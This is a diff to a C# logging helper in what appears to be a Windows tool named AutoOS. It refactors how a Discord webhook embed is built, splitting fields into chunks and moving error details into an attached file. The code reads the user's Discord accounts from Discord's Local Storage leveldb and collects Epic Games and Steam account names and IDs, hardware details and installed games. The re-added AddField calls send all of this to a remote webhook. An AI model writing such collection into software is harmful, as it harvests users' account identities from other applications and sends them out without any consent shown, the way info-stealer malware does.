@@ -71,7 +71,7 @@ public static partial class LogHelper
 
     public static async Task LogError(Exception ex, IEnumerable<GpuInfo> selectedGpus = null, string actionTitle = null)
     {
-        var embed = await GetOverview(selectedGpus, ex, actionTitle);
+        var embed = await GetOverview(selectedGpus, ex);
         var webhookPayload = new JsonObject
         {
             ["embeds"] = new JsonArray { (JsonNode)embed }
@@ -81,6 +81,27 @@ public static partial class LogHelper
         {
             { new StringContent(webhookPayload.ToJsonString()), "payload_json" }
         };
+
+        if (ex != null)
+        {
+            var errorSb = new StringBuilder();
+            errorSb.AppendLine($"{ex.GetType().FullName}");
+            errorSb.AppendLine($"Message: {ex.Message}");
+            errorSb.AppendLine($"HResult: 0x{ex.HResult:X}");
+            errorSb.AppendLine($"Source: {ex.Source}");
+            errorSb.AppendLine(ex.StackTrace);
+            if (ex.InnerException != null)
+            {
+                errorSb.AppendLine("**InnerException:**");
+                errorSb.AppendLine(ex.InnerException.ToString());
+            }
+            if (!string.IsNullOrEmpty(actionTitle))
+            {
+                errorSb.AppendLine($"**Action Title:** {actionTitle}");
+            }
+
+            multipart.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(errorSb.ToString())), "file", "error.txt");
+        }
 
         if (!string.IsNullOrEmpty(LogConfig.Error))
         {
@@ -160,7 +181,7 @@ public static partial class LogHelper
         }
     }
 
-    private static async Task<JsonObject> GetOverview(IEnumerable<GpuInfo> selectedGpus = null, Exception ex = null, string actionTitle = null)
+    private static async Task<JsonObject> GetOverview(IEnumerable<GpuInfo> selectedGpus = null, Exception ex = null)
     {
         // local discord
         var discordAccounts = DiscordHelper.GetAccountData(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord", "Local Storage", "leveldb"));
@@ -404,92 +425,64 @@ public static partial class LogHelper
         var embed = new JsonObject
         {
             ["color"] = ex != null ? 4466470 : 3751195,
-            ["fields"] = new JsonArray
-            {
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Discord",
-                    ["value"] = discordAccounts != null && discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(a => $"{a.Username} <@{a.UserId}> [{a.Origin}]{(a.IsActive ? " [Active]" : "")}")) : "N/A",
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Epic Games",
-                    ["value"] = epicAccounts != null && epicAccounts.Count > 0 ? string.Join("\n", epicAccounts.Select(a => $"{a.DisplayName}{(a.IsActive ? " [Active]" : "")}")) : "N/A",
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Steam",
-                    ["value"] = steamAccounts != null && steamAccounts.Count > 0 ? string.Join("\n", steamAccounts.Select(a => $"[{a.AccountName}](https://steamcommunity.com/profiles/{a.Steam64Id}){(a.AllowAutoLogin ? " [Active]" : "")}")) : "N/A",
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Motherboard",
-                    ["value"] = motherboard,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "CPU",
-                    ["value"] = cpuName,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "RAM",
-                    ["value"] = ram,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "GPUs",
-                    ["value"] = gpus,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Displays",
-                    ["value"] = monitors,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "NICs",
-                    ["value"] = nics,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Audio Devices",
-                    ["value"] = audioInfo,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Games",
-                    ["value"] = games,
-                    ["inline"] = false
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "OS Build",
-                    ["value"] = OSHelper.GetWindowsVersionString(),
-                    ["inline"] = true
-                },
-                (JsonNode)new JsonObject
-                {
-                    ["name"] = "Installation Details",
-                    ["value"] = installationDetails,
-                    ["inline"] = true
-                }
-            },
             ["footer"] = new JsonObject
             {
                 ["text"] = $"AutoOS {ProcessInfoHelper.Version}"
             }
         };
+
+        var fieldsArray = new JsonArray();
+        embed["fields"] = fieldsArray;
+
+        void AddField(string name, string value, bool inline = false)
+        {
+            if (string.IsNullOrEmpty(value)) value = "N/A";
+
+            int offset = 0;
+            while (offset < value.Length)
+            {
+                if (fieldsArray.Count >= 25) break;
+
+                int length = Math.Min(1024, value.Length - offset);
+                
+                if (length == 1024)
+                {
+                    int lastNewline = value.LastIndexOf('\n', offset + length - 1, length);
+                    if (lastNewline > offset)
+                    {
+                        length = lastNewline - offset + 1;
+                    }
+                }
+
+                string chunk = value.Substring(offset, length).TrimEnd();
+                if (string.IsNullOrEmpty(chunk)) 
+                {
+                    offset += length;
+                    continue;
+                }
+
+                string fieldName = name;
+                if (fieldName.Length > 256) fieldName = fieldName.Substring(0, 256);
+
+                fieldsArray.Add((JsonNode)new JsonObject { ["name"] = fieldName, ["value"] = chunk, ["inline"] = inline });
+                
+                offset += length;
+            }
+        }
+
+        AddField("Discord", discordAccounts != null && discordAccounts.Count > 0 ? string.Join("\n", discordAccounts.Select(a => $"{a.Username} <@{a.UserId}> [{a.Origin}]{(a.IsActive ? " [Active]" : "")}")) : "N/A");
+        AddField("Epic Games", epicAccounts != null && epicAccounts.Count > 0 ? string.Join("\n", epicAccounts.Select(a => $"{a.DisplayName}{(a.IsActive ? " [Active]" : "")}")) : "N/A");
+        AddField("Steam", steamAccounts != null && steamAccounts.Count > 0 ? string.Join("\n", steamAccounts.Select(a => $"[{a.AccountName}](https://steamcommunity.com/profiles/{a.Steam64Id}){(a.AllowAutoLogin ? " [Active]" : "")}")) : "N/A");
+        AddField("Motherboard", motherboard);
+        AddField("CPU", cpuName);
+        AddField("RAM", ram);
+        AddField("GPUs", gpus);
+        AddField("Displays", monitors);
+        AddField("NICs", nics);
+        AddField("Audio Devices", audioInfo);
+        AddField("Games", games);
+        AddField("OS Build", OSHelper.GetWindowsVersionString(), true);
+        AddField("Installation Details", installationDetails, true);
 
         var activeDiscordAccount = discordAccounts?.FirstOrDefault(active => active.IsActive) ?? discordAccounts?.FirstOrDefault();
         if (activeDiscordAccount != null)
@@ -500,34 +493,6 @@ public static partial class LogHelper
                 ["icon_url"] = $"https://cdn.discordapp.com/avatars/{activeDiscordAccount.UserId}/{activeDiscordAccount.Avatar}.webp?size=64",
                 ["url"] = $"https://discord.com/users/{activeDiscordAccount.UserId}"
             };
-        }
-
-        if (ex != null)
-        {
-            var errorSb = new StringBuilder();
-            errorSb.AppendLine($"{ex.GetType().FullName}");
-            errorSb.AppendLine($"Message: {ex.Message}");
-            errorSb.AppendLine($"HResult: 0x{ex.HResult:X}");
-            errorSb.AppendLine($"Source: {ex.Source}");
-            errorSb.AppendLine(ex.StackTrace);
-            if (ex.InnerException != null)
-            {
-                errorSb.AppendLine("**InnerException:**");
-                errorSb.AppendLine(ex.InnerException.ToString());
-            }
-            if (!string.IsNullOrEmpty(actionTitle))
-            {
-                errorSb.AppendLine($"**Action Title:** {actionTitle}");
-            }
-
-            var errorField = new JsonObject
-            {
-                ["name"] = "Error Details",
-                ["value"] = errorSb.ToString(),
-                ["inline"] = false
-            };
-
-            ((JsonArray)embed["fields"]).Insert(10, (JsonNode)errorField);
         }
 
         return embed;
